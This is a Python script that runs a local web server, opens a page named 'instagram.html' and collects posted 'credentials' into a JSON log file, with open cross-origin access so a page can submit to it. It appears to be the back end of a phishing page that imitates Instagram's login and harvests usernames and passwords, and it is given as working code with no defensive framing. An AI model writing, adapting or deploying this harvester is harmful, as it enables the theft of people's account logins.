
import http.server
import socketserver
import json
import os
import webbrowser

PORT = 8088
LOG_FILE = 'credentials_log.json'

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                credentials = json.loads(post_data)
                
                print(f"Received credentials: {credentials}")

                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r+') as f:
                        try:
                            data = json.load(f)
                        except json.JSONDecodeError:
                            data = []
                        data.append(credentials)
                        f.seek(0)
                        json.dump(data, f, indent=4)
                else:
                    with open(LOG_FILE, 'w') as f:
                        json.dump([credentials], f, indent=4)

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode())

            except json.JSONDecodeError:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'error', 'message': 'Invalid JSON'}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200, "ok")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header("Access-Control-Allow-Headers", "X-Requested-With, Content-type")
        self.end_headers()

Handler = MyHttpRequestHandler

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    url = f"http://127.0.0.1:{PORT}/instagram.html"
    print(f"Serving at {url}")
    webbrowser.open_new_tab(url)
    httpd.serve_forever()
